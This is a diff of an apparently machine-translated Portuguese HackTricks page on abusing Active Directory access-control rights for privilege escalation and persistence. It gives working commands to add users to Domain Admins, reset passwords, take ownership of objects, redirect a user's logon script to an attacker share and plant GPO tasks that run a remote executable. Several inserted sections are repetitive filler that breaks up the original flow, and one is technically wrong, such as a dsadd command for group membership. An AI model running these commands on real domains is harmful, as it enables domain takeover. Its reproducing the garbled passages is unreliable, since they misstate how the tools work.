@@ -8,7 +8,7 @@
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -16,7 +16,7 @@
 
 Este laboratório é para abusar das permissões fracas das Listas de Controle de Acesso Discricionário (DACLs) e Entradas de Controle de Acesso (ACEs) do Active Directory que compõem as DACLs.
 
-Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACL/ACEs definem quem pode ler/modificar esses objetos (ou seja, alterar o nome da conta, redefinir a senha, etc.).
+Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACL/ACEs definem quem pode ler/modificar esses objetos (ou seja, alterar o nome da conta, redefinir a senha, etc).
 
 Um exemplo de ACEs para o objeto segurável "Administradores de Domínio" pode ser visto aqui:
 
@@ -30,7 +30,7 @@ Algumas das permissões e tipos de objetos do Active Directory que nós, como at
 * **WriteDACL** - modificar as ACEs do objeto e dar ao atacante o direito de controle total sobre o objeto
 * **AllExtendedRights** - capacidade de adicionar usuário a um grupo ou redefinir senha
 * **ForceChangePassword** - capacidade de alterar a senha do usuário
-* **Self (Self-Membership)** - capacidade de adicionar a si mesmo a um grupo
+* **Self (Self-Membership)** - capacidade de adicionar-se a um grupo
 
 Neste laboratório, vamos explorar e tentar explorar a maioria das ACEs acima.
 
@@ -81,37 +81,33 @@ Get-NetGroup "domain admins" -FullData
 
 ## Descrição
 
-O abuso de persistência de ACL é uma técnica que permite a um invasor manter o acesso a um sistema comprometido, mesmo depois que suas credenciais tenham sido revogadas ou alteradas. Isso é feito modificando as listas de controle de acesso (ACLs) em objetos do Active Directory para conceder permissões adicionais a uma conta comprometida.
+O abuso de persistência de ACL é uma técnica de persistência que envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Essa técnica é particularmente útil para manter o acesso após a escalada de privilégios.
 
 ## Detalhes
 
-As ACLs são usadas para controlar o acesso a objetos do Active Directory, como usuários, grupos e computadores. Cada objeto tem uma ACL associada a ele, que lista as contas que têm permissão para acessar o objeto e o tipo de acesso que cada conta tem. As permissões podem ser concedidas a contas individuais ou a grupos de contas.
+O Active Directory usa listas de controle de acesso (ACLs) para controlar o acesso a objetos, como usuários, grupos e computadores. As ACLs contêm entradas de permissão que especificam quais usuários e grupos têm acesso a um objeto e que tipo de acesso eles têm. As permissões podem ser modificadas por usuários com privilégios suficientes, como administradores de domínio.
 
-Os invasores podem abusar da persistência de ACL de várias maneiras, incluindo:
+O abuso de persistência de ACL envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Por exemplo, um invasor pode adicionar sua conta de usuário a um grupo de administradores de domínio ou conceder permissões de controle total a um objeto do Active Directory que contém informações confidenciais. Dessa forma, o invasor pode manter o acesso mesmo que suas credenciais originais sejam revogadas.
 
-* Adicionando uma conta comprometida a um grupo com permissões elevadas em um objeto do Active Directory.
-* Concedendo permissões adicionais a uma conta comprometida em um objeto do Active Directory.
-* Modificando as permissões em um objeto do Active Directory para permitir que uma conta comprometida execute ações que normalmente não seriam permitidas.
+## Exemplo
 
-Essas técnicas permitem que um invasor mantenha o acesso a um sistema comprometido, mesmo depois que suas credenciais tenham sido revogadas ou alteradas. Isso pode ser especialmente perigoso em ambientes em nuvem, onde as credenciais são frequentemente rotacionadas automaticamente.
+Um invasor com acesso de leitura em um objeto do Active Directory pode usar a ferramenta `dsacls` para visualizar as permissões de acesso no objeto:
 
-## Detecção
+```
+dsacls.exe "CN=Domain Admins,CN=Users,DC=example,DC=com"
+```
 
-A detecção de abuso de persistência de ACL pode ser difícil, pois as alterações nas ACLs podem ser difíceis de detectar. No entanto, existem algumas técnicas que podem ajudar a identificar esse tipo de atividade:
+O invasor pode então usar a ferramenta `dsadd` para adicionar sua conta de usuário ao grupo de administradores de domínio:
 
-* Monitorar as alterações nas ACLs de objetos do Active Directory.
-* Monitorar as alterações nas associações de grupo de contas do Active Directory.
-* Monitorar as tentativas de acesso a objetos do Active Directory por contas que normalmente não teriam permissão para acessá-los.
+```
+dsadd.exe "CN=Domain Admins,CN=Users,DC=example,DC=com" -members "CN=Hacker,CN=Users,DC=example,DC=com"
+```
 
-## Prevenção
+O invasor agora tem acesso de administrador de domínio e pode usar outras técnicas de escalada de privilégios para obter acesso persistente.
 
-Para prevenir o abuso de persistência de ACL, é importante seguir as práticas recomendadas de segurança do Active Directory, incluindo:
+## Mitigação
 
-* Limitar as permissões de conta a apenas o que é necessário para realizar as tarefas necessárias.
-* Monitorar as alterações nas ACLs e associações de grupo de contas do Active Directory.
-* Implementar a autenticação multifator para contas com permissões elevadas.
-* Implementar a rotação automática de credenciais para contas com permissões elevadas.
-* Implementar a segregação de funções para limitar o acesso a objetos do Active Directory.
+Para mitigar o abuso de persistência de ACL, é importante limitar o número de usuários com privilégios suficientes para modificar as permissões de acesso em objetos do Active Directory. Além disso, é importante monitorar as alterações nas permissões de acesso e restringir o acesso a objetos que contêm informações confidenciais.
 ```csharp
  Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
 ```
@@ -133,9 +129,9 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ```
 ## GenericAll / GenericWrite / Write no Computador/Usuário
 
-* Se você tiver esses privilégios em um **objeto de computador**, você pode realizar [Delegação Restrita Baseada em Recursos do Kerberos: Assumir o controle do objeto de computador](../resource-based-constrained-delegation.md).
+* Se você tiver esses privilégios em um **objeto de computador**, você pode realizar a técnica de [Delegação Restrita Baseada em Recursos do Kerberos: Assumir o controle do objeto de computador](../resource-based-constrained-delegation.md).
 * Se você tiver esses privilégios em um usuário, você pode usar um dos [primeiros métodos explicados nesta página](./#genericall-on-user).
-* Ou, se você tiver em um computador ou usuário, você pode usar as **Credenciais de Sombra** para se passar por ele:
+* Ou, se você tiver esses privilégios em um computador ou usuário, você pode usar as **Credenciais de Sombra** para se passar por ele:
 
 {% content-ref url="shadow-credentials.md" %}
 [shadow-credentials.md](shadow-credentials.md)
@@ -143,11 +139,11 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## WriteProperty no Grupo
 
-Se o usuário controlado tiver o direito `WriteProperty` em `Todos` os objetos para o grupo `Administradores de Domínio`:
+Se o usuário controlado tiver o direito de `WriteProperty` em `All` objetos para o grupo `Domain Admin`:
 
 ![](../../../.gitbook/assets/7.png)
 
-Podemos adicionar a nós mesmos ao grupo `Administradores de Domínio` e escalar privilégios:
+Podemos adicionar a nós mesmos ao grupo `Domain Admins` e escalar privilégios:
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -167,43 +163,36 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 ```
 # Abuso de Persistência de ACL
 
-## Introdução
+## Descrição
 
-O Active Directory é um serviço de diretório que armazena informações sobre objetos em uma rede e torna essas informações disponíveis para usuários e administradores da rede. O Active Directory usa listas de controle de acesso (ACLs) para controlar o acesso a objetos em uma rede. As ACLs especificam quais usuários e grupos têm permissão para acessar um objeto e quais ações eles podem executar nesse objeto.
+O abuso de persistência de ACL é uma técnica de persistência que envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Essa técnica é particularmente útil para manter o acesso após a exploração inicial do ambiente.
 
-Os atacantes podem abusar da persistência de ACL para manter o acesso a uma rede comprometida. O abuso de persistência de ACL envolve a adição de permissões a objetos em uma rede que permitem que um atacante mantenha o acesso a esses objetos, mesmo que suas credenciais sejam revogadas.
+## Detalhes
 
-## Técnicas de Abuso de Persistência de ACL
+O Active Directory usa listas de controle de acesso (ACLs) para definir permissões em objetos, como usuários, grupos e computadores. As ACLs contêm uma lista de identidades de segurança e as permissões que cada identidade tem em relação ao objeto. As permissões incluem coisas como ler, gravar, modificar e excluir.
 
-### Adicionar permissões a objetos do Active Directory
+Os atacantes podem abusar da persistência de ACL modificando as permissões em objetos do Active Directory para garantir acesso futuro. Por exemplo, um atacante pode adicionar sua própria conta de usuário a um grupo de administradores de domínio ou conceder permissões de leitura/gravação em um objeto de serviço que contém senhas de usuário.
 
-Os atacantes podem adicionar permissões a objetos do Active Directory para manter o acesso a uma rede comprometida. Eles podem adicionar permissões a objetos como contas de usuário, grupos de segurança e unidades organizacionais (OUs).
+Os atacantes podem usar várias ferramentas e técnicas para abusar da persistência de ACL, incluindo:
 
-Os atacantes podem adicionar permissões a objetos do Active Directory usando várias técnicas, incluindo:
-
-- Modificar as ACLs dos objetos do Active Directory usando ferramentas como o PowerShell ou o ADSI Edit.
-- Usando técnicas de injeção de código para adicionar permissões a objetos do Active Directory.
-- Usando técnicas de engenharia social para obter acesso a credenciais de administrador e, em seguida, adicionar permissões a objetos do Active Directory.
-
-### Abusar de permissões existentes
-
-Os atacantes também podem abusar de permissões existentes em objetos do Active Directory para manter o acesso a uma rede comprometida. Eles podem abusar de permissões em objetos como contas de usuário, grupos de segurança e OUs.
-
-Os atacantes podem abusar de permissões existentes em objetos do Active Directory usando várias técnicas, incluindo:
-
-- Usando permissões de leitura para obter informações confidenciais sobre a rede.
-- Usando permissões de gravação para modificar objetos do Active Directory e adicionar permissões adicionais.
-- Usando permissões de execução para executar comandos no contexto de um usuário com permissões elevadas.
+* Ferramentas de linha de comando, como `dsacls.exe` e `icacls.exe`
+* Ferramentas de terceiros, como BloodHound e PowerSploit
+* Scripts personalizados
 
 ## Mitigação
 
 Para mitigar o abuso de persistência de ACL, as organizações devem implementar as seguintes práticas recomendadas:
 
-- Monitorar as alterações nas ACLs dos objetos do Active Directory.
-- Limitar o número de usuários com permissões de administrador no Active Directory.
-- Implementar políticas de senha fortes e multifatoriais para contas de usuário com permissões elevadas.
-- Implementar controles de acesso baseados em função (RBAC) para limitar o acesso a objetos do Active Directory.
-- Implementar soluções de detecção de intrusão (IDS) para detectar atividades suspeitas em objetos do Active Directory.
+* Monitorar as alterações de permissão em objetos do Active Directory
+* Limitar o número de usuários com permissões de administrador de domínio
+* Implementar o princípio do menor privilégio
+* Usar grupos de segurança para gerenciar permissões em objetos do Active Directory
+* Implementar a autenticação multifator para contas de usuário com permissões elevadas
+
+## Créditos
+
+* [Harmj0y](https://twitter.com/HarmJ0y) - Desenvolvedor do BloodHound e co-fundador da SpecterOps
+* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Coleção de scripts do PowerShell para pós-exploração e persistência
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
@@ -222,7 +211,7 @@ Outro método que não requer mexer com a conversão de senha segura em string:
 $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 ```
-...ou um comando em uma linha se não houver uma sessão interativa disponível:
+...ou um comando em uma linha, se não houver uma sessão interativa disponível:
 ```csharp
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
@@ -233,7 +222,7 @@ E uma última maneira de realizar isso a partir do Linux:
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## WriteOwner em Grupo
+## WriteOwner no Grupo
 
 Observe que antes do ataque o proprietário do `Domain Admins` é `Domain Admins`:
 
@@ -243,23 +232,29 @@ Após a enumeração ACE, se descobrirmos que um usuário sob nosso controle tem
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-Podemos alterar o proprietário do objeto `Domain Admins` para o nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
+Podemos alterar o proprietário do objeto `Domain Admins` para nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
 ```csharp
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 //You can also use the name instad of the SID (HTB: Reel)
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-## GenericWrite em Usuário
+## GenericWrite no Usuário
 
-O privilégio `GenericWrite` em um objeto de usuário do Active Directory permite que um usuário modifique as permissões de controle de acesso do objeto. Isso pode ser abusado para obter persistência em um ambiente do Active Directory.
+O objetivo deste método é obter persistência em um ambiente do Active Directory usando a permissão `GenericWrite` em um objeto de usuário. Essa permissão permite que um usuário modifique as permissões de outros usuários, incluindo a si mesmo. Isso pode ser usado para obter privilégios elevados em uma conta de usuário ou para criar uma nova conta de usuário com privilégios elevados.
 
-Para realizar esse ataque, um invasor precisa ter permissões de gravação no objeto de usuário. O invasor pode então adicionar permissões adicionais ao objeto de usuário, concedendo a si mesmo acesso futuro ao objeto. Isso pode ser feito adicionando uma nova entrada de controle de acesso (ACE) ao objeto de usuário, concedendo ao invasor permissões de controle total ou permissões de gravação adicionais.
+### Passo a passo
 
-Para evitar esse tipo de ataque, é importante limitar as permissões de gravação em objetos de usuário do Active Directory e monitorar as alterações nas permissões de controle de acesso.
+1. Identifique um usuário com a permissão `GenericWrite` em seu objeto. Isso pode ser feito usando a ferramenta BloodHound ou por meio de engenharia reversa das permissões do usuário.
+2. Modifique as permissões do objeto do usuário para conceder a si mesmo ou a outro usuário privilégios elevados, como a adição de um usuário a um grupo de administradores do domínio.
+3. Use as novas permissões para obter acesso persistente ao ambiente do Active Directory.
+
+### Mitigação
+
+Para mitigar esse tipo de ataque, é recomendável limitar as permissões `GenericWrite` em objetos de usuário a usuários confiáveis e monitorar as alterações nas permissões do usuário. Além disso, é importante limitar o número de usuários com privilégios elevados e monitorar as alterações nas permissões desses usuários.
 ```csharp
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-`WriteProperty` em um `ObjectType`, que neste caso particular é `Script-Path`, permite que o invasor sobrescreva o caminho do script de logon do usuário `delegate`, o que significa que na próxima vez que o usuário `delegate` fizer login, seu sistema executará nosso script malicioso:
+`WriteProperty` em um `ObjectType`, que neste caso particular é `Script-Path`, permite que o invasor sobrescreva o caminho do script de logon do usuário `delegate`, o que significa que na próxima vez em que o usuário `delegate` fizer login, seu sistema executará nosso script malicioso:
 ```csharp
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -291,7 +286,7 @@ O que você pode, é claro, fazer através do powershell:
 ```csharp
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
-Se você tem permissão `WriteDACL` em um objeto AD:
+Se você tem permissão `WriteDACL` nesse objeto AD:
 
 ![](../../../.gitbook/assets/24.png)
 
@@ -307,7 +302,7 @@ O que significa que agora você tem controle total sobre o objeto AD:
 
 ![](../../../.gitbook/assets/25.png)
 
-Isso efetivamente significa que você pode adicionar novos usuários ao grupo.
+Isso efetivamente significa que agora você pode adicionar novos usuários ao grupo.
 
 Interessante notar que eu não pude abusar desses privilégios usando o módulo Active Directory e os cmdlets `Set-Acl` / `Get-Acl`:
 ```csharp
@@ -340,7 +335,7 @@ O abaixo indica que o usuário `offense\spotless` tem privilégios de **WritePro
 
 ### Enumerar Permissões de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
-Sabemos que o ObjectDN acima da captura de tela acima se refere ao GPO `New Group Policy Object`, uma vez que o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, conforme destacado abaixo:
+Sabemos que o ObjectDN acima da captura de tela acima se refere ao GPO `New Group Policy Object`, já que o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, como destacado abaixo:
 
 ![](../../../.gitbook/assets/a15.png)
 
@@ -348,37 +343,39 @@ Se quisermos procurar especificamente por GPOs mal configurados, podemos encadea
 ```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
-![](../../../.gitbook/assets/a16.png)
-
 **Computadores com uma Política Aplicada Específica**
 
 Agora podemos resolver os nomes dos computadores em que a GPO `Política Mal Configurada` é aplicada:
 ```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
-**Políticas aplicadas a um computador específico**
+**Políticas Aplicadas a um Computador Específico**
 
-Para verificar as políticas aplicadas a um computador específico, podemos usar o comando `gpresult /r /scope computer`. Este comando exibirá todas as políticas aplicadas ao computador, incluindo as políticas de segurança. Podemos usar essa informação para identificar possíveis vulnerabilidades de segurança e explorá-las para obter acesso não autorizado.
+Este método pode ser usado para identificar as políticas aplicadas a um computador específico. Isso pode ser útil para identificar quais políticas estão sendo aplicadas a um controlador de domínio ou a um servidor de arquivos. Para fazer isso, você pode usar o seguinte comando:
+
+```
+gpresult /h report.html
+```
+
+Este comando irá gerar um relatório HTML que contém informações sobre as políticas aplicadas ao computador. Você pode abrir o relatório em um navegador da web para visualizar as informações. O relatório incluirá informações sobre as políticas de computador e usuário aplicadas, bem como informações sobre as configurações de segurança aplicadas ao computador.
 ```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 **OUs com uma política aplicada**
 
-Esta técnica envolve a criação de uma nova política de grupo (GPO) e a vinculação a uma unidade organizacional (OU) específica. Em seguida, é possível adicionar permissões personalizadas à política para permitir que um usuário ou grupo específico modifique a política. Isso pode ser usado para permitir que um usuário mal-intencionado modifique a política para incluir um backdoor ou outra forma de persistência.
-
-Para verificar se uma OU tem uma política aplicada, você pode usar o seguinte comando:
+Esta seção descreve como encontrar OUs que têm uma política específica aplicada. Isso pode ser útil para encontrar OUs que possam ser alvos de abuso de persistência de ACL. Para fazer isso, você pode usar o cmdlet `Get-GPOReport` para gerar um relatório HTML de todas as políticas de grupo aplicadas e, em seguida, pesquisar o relatório para a política específica que você está procurando. Aqui está um exemplo:
 
 ```
-Get-ADOrganizationalUnit -Identity "OU=TestOU,DC=example,DC=com" -Properties gPLink
+Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
 ```
 
-Isso retornará a política vinculada à OU, se houver uma. Se a política estiver vinculada, você pode usar o seguinte comando para verificar as permissões da política:
+Este comando gera um relatório HTML de todas as políticas de grupo aplicadas e as salva em um arquivo chamado `AllGPOs.html`. Em seguida, você pode pesquisar o arquivo HTML para a política específica que você está procurando. Por exemplo, se você estiver procurando por uma política chamada "Política de Segurança", poderá pesquisar o arquivo HTML usando o seguinte comando:
 
 ```
-Get-GPPermissions -Guid "{PolicyGUID}" -All
+Select-String -Path AllGPOs.html -Pattern "Política de Segurança"
 ```
 
-Isso retornará todas as permissões para a política especificada pelo GUID. Se houver permissões personalizadas que permitam a modificação da política, isso poderá ser usado para criar persistência.
+Este comando pesquisa o arquivo HTML `AllGPOs.html` para a string "Política de Segurança" e retorna todas as linhas que contêm essa string. Se houver uma linha que corresponda à política que você está procurando, ela mostrará o nome da política e o caminho da OU em que ela está aplicada.
 ```powershell
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
@@ -413,23 +410,23 @@ Este payload, após a atualização do GPO, também precisará que alguém faça
 ### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**
 
 {% hint style="info" %}
-Ele não pode criar GPOs, então ainda precisamos fazer isso com o RSAT ou modificar um ao qual já temos acesso de gravação.
+Não pode criar GPOs, portanto, ainda precisamos fazer isso com RSAT ou modificar um ao qual já temos acesso de gravação.
 {% endhint %}
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
 ### Forçar Atualização de Política <a href="#force-policy-update" id="force-policy-update"></a>
 
-As atualizações abusivas anteriores de **GPO são recarregadas** aproximadamente a cada 90 minutos.\
+As atualizações abusivas anteriores do **GPO são recarregadas** aproximadamente a cada 90 minutos.\
 Se você tiver acesso ao computador, pode forçá-lo com `gpupdate /force`.
 
 ### Sob o capô <a href="#under-the-hood" id="under-the-hood"></a>
 
-Se observarmos as Tarefas Agendadas da GPO `Misconfigured Policy`, podemos ver nossa `evilTask` sentada lá:
+Se observarmos as Tarefas Agendadas do GPO `Misconfigured Policy`, podemos ver nossa `evilTask` sentada lá:
 
 ![](../../../.gitbook/assets/a22.png)
 
-Abaixo está o arquivo XML que foi criado por `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa na GPO:
+Abaixo está o arquivo XML que foi criado por `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa no GPO:
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
 ```markup
@@ -492,7 +489,7 @@ Abaixo está o arquivo XML que foi criado por `New-GPOImmediateTask` que represe
 ```
 ### Usuários e Grupos <a href="#usuários-e-grupos" id="usuários-e-grupos"></a>
 
-A mesma escalada de privilégios pode ser alcançada abusando da funcionalidade de Usuários e Grupos do GPO. Note no arquivo abaixo, na linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - poderíamos mudar o usuário para outro, adicionar outro ou até mesmo adicionar o usuário a outro grupo/múltiplos grupos, já que podemos alterar o arquivo de configuração da política no local mostrado devido à delegação GPO atribuída ao nosso usuário `spotless`:
+A mesma escalada de privilégios pode ser alcançada abusando da funcionalidade de Usuários e Grupos do GPO. Observe no arquivo abaixo, na linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - podemos alterar o usuário para outra coisa, adicionar outro ou até mesmo adicionar o usuário a outro grupo/múltiplos grupos, já que podemos alterar o arquivo de configuração da política no local mostrado devido à delegação do GPO atribuída ao nosso usuário `spotless`:
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
@@ -522,7 +519,7 @@ Além disso, poderíamos pensar em aproveitar scripts de logon/logoff, usar o re
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
